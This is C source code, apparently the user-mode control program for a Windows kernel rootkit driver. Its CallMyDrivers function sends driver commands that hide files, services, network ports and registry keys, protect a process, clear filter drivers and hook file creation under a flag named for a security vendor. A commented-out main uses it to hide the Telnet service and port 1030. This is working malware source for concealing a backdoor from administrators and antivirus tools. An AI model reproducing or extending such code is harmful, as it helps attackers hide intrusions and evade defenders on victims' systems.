#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>

#define CODEMSG(_number) CTL_CODE(FILE_DEVICE_UNKNOWN,_number , METHOD_BUFFERED,\
	FILE_READ_DATA | FILE_WRITE_DATA)       

#define NO_MSG 2048
#define START_PROTECT 4086
#define START_HIDEFILE 4087
#define START_HIDESERVICES 4088
#define START_HIDEPORT 4089
#define  START_HIDEKEY 4090
#define START_CHECKHOOK 4091

#define START_PARAKEY  4092
#define START_DLLPATH 4093
#define START_CLEARFILER 4094

#define START_HOOKIOCREATEFILE 4095

int CallMyDrivers(char *ID,char *lpBuffer)
{
	HANDLE service = 0;
	HANDLE device = 0;
	char ret[1024];
	WCHAR ToSend[512];
	DWORD code, bytes;

	device = CreateFile("\\\\.\\Protection",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);

	if( !device || device==INVALID_HANDLE_VALUE ) {   
		printf("cannot communicate with the driver.\n");
		return FALSE; 
	}

	code = NO_MSG;  

	if( !strcmp(ID,"-hook") ) {
		code = START_PROTECT;
	}
	if( !strcmp(ID,"-port") ) {
		code = START_HIDEPORT;
	}
	if( !strcmp(ID,"-services") ) {
		code = START_HIDESERVICES;
	}
	if( !strcmp(ID,"-key") ) {
		code = START_HIDEKEY;
	}
	if( !strcmp(ID,"-check") ) {
		code = START_CHECKHOOK;
	}
	if( !strcmp(ID,"-param") ) {
		code = START_PARAKEY;
	}
	if( !strcmp(ID,"-dllpath") ) {
		code = START_DLLPATH;
	}
	if( !strcmp(ID,"-clearfilers") ) {
		code = START_CLEARFILER;
	}
	if( !strcmp(ID,"-file") ) {
		code = START_HIDEFILE;
	}
	if( !strcmp(ID,"-ESTsoft") ) {
		code = START_HOOKIOCREATEFILE;
	}

	MultiByteToWideChar(CP_ACP, 0,lpBuffer, -1, ToSend, sizeof(ToSend));
	DeviceIoControl(device, CODEMSG(code), ToSend, (wcslen(ToSend)+1)*2, 
		&ret, sizeof(ret),&bytes,NULL);                       
	CloseHandle(device);
	return TRUE;
}
/*
int main(int argc, char* argv[])
{

char szPid[10];

memset(szPid,0,sizeof(szPid));
//DWORD pid=GetCurrentProcessId();
wsprintf(szPid,"%d",GetCurrentProcessId());
CallMyDrivers("-hook",szPid);
CallMyDrivers("-services","TlntSvr");
CallMyDrivers("-port","1030");
CallMyDrivers("-key","ACPI");
getchar();

return 0;
}
*/